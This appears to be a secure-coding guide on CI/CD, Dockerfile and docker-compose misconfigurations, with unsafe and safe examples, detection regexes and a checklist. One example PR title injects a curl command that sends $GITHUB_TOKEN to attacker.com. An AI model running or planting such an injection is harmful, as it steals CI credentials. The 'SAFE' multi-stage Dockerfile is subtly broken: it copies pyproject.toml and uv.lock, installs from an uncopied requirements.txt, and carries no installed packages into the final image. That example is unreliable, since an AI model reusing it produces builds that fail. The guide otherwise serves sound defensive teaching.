# Infrastructure security

Infrastructure misconfigurations in CI/CD pipelines, containers, and deployment configuration can expose secrets, enable code injection, or give attackers persistent access. These issues are often invisible in application code reviews but represent critical attack surface.

## OWASP mapping

A05:2025 Security Misconfiguration

## Vulnerable patterns

### CI/CD workflow injection

```yaml
# UNSAFE: User-controlled input in run step — enables code injection
- run: echo "Processing PR: ${{ github.event.pull_request.title }}"
# Attacker PR title: "; curl attacker.com/steal?token=$GITHUB_TOKEN #

# UNSAFE: pull_request_target with PR code checkout — runs untrusted code with write access
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # Checks out attacker's code
      - run: make build  # Runs attacker's Makefile with repo write permissions
```

### Overly permissive CI permissions

```yaml
# UNSAFE: Default write-all permissions
permissions: write-all

# UNSAFE: No permissions block (inherits repo defaults, often too broad)
jobs:
  build:
    runs-on: ubuntu-latest
```

### Dockerfile security issues

```dockerfile
# UNSAFE: Running as root (default)
FROM python:3.12
COPY . /app
RUN pip install -r requirements.txt
CMD ["python", "app.py"]  # Runs as root

# UNSAFE: Secrets in build args or ENV
ARG DATABASE_PASSWORD
ENV API_KEY=sk-prod-realkey123

# UNSAFE: Using latest tag (unpinned, unreproducible)
FROM node:latest
```

### Environment variable exposure

```yaml
# UNSAFE: Secrets in docker-compose.yml (committed to repo)
services:
  app:
    environment:
      - DATABASE_PASSWORD=s3cret
      - API_KEY=sk-prod-realkey123
```

## Safe patterns

### Secure CI/CD workflows

```yaml
# SAFE: Minimal permissions, explicit grants
permissions:
  contents: read
  pull-requests: write

# SAFE: Environment variables instead of expression injection
- name: Process PR
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Processing PR: $PR_TITLE"  # Shell variable, not template injection
```

### Secure Dockerfiles

```dockerfile
# SAFE: Non-root user, pinned version, multi-stage build
FROM python:3.12-slim AS builder
WORKDIR /app
COPY pyproject.toml uv.lock ./
RUN pip install --no-cache-dir -r requirements.txt

FROM python:3.12-slim
RUN useradd --create-home appuser
WORKDIR /app
COPY --from=builder /app /app
COPY . .
USER appuser
CMD ["python", "app.py"]
```

### Secure environment handling

```yaml
# SAFE: Reference secrets from secrets manager or CI secrets
services:
  app:
    env_file:
      - .env # .env is in .gitignore, not committed
    environment:
      - DATABASE_PASSWORD # Value from host environment, not hardcoded
```

## Detection patterns

| Pattern                                    | What it finds                      |
| ------------------------------------------ | ---------------------------------- |
| `\$\{\{.*github\.event` in `run:` steps    | Workflow injection via expressions |
| `pull_request_target` + `actions/checkout` | Untrusted code with write access   |
| `permissions:\s*write-all`                 | Overly permissive CI permissions   |
| `FROM.*:latest`                            | Unpinned container base image      |
| `USER` directive missing in Dockerfile     | Running as root                    |
| `ARG.*PASSWORD\|ARG.*SECRET\|ARG.*KEY`     | Secrets in build args              |
| `ENV.*KEY=\|ENV.*SECRET=\|ENV.*PASSWORD=`  | Secrets in container ENV           |

## Framework protections

- **GitHub Actions**: Secrets are masked in logs automatically. `permissions:` block limits token scope. Environment protection rules gate deployments.
- **Docker BuildKit**: `--mount=type=secret` passes secrets without baking them into layers.
- **GitHub**: Branch protection rules prevent direct pushes. Required reviews prevent unilateral changes.

## False positive guidance

- Non-sensitive environment variables in docker-compose (`PORT`, `NODE_ENV`, `LOG_LEVEL`) — safe.
- `${{ }}` expressions in `if:` conditions or `with:` parameters (not `run:` steps) — not injectable.
- Development-only Docker configs without security hardening — lower risk if never used in production.
- `FROM :latest` in development/CI Dockerfiles used for testing — lower risk but still flag.

## Testing checklist

1. Do any `run:` steps in GitHub Actions workflows contain `${{ github.event.* }}` expressions?
2. Are workflow `permissions:` explicitly set to minimum required (not `write-all` or omitted)?
3. Does the Dockerfile specify a `USER` directive to avoid running as root?
4. Are container base images pinned to specific versions (not `:latest`)?
5. Are secrets passed via environment variables or secret mounts (not `ARG` or `ENV` with values)?
6. Is `.env` in `.gitignore` to prevent committing secrets?
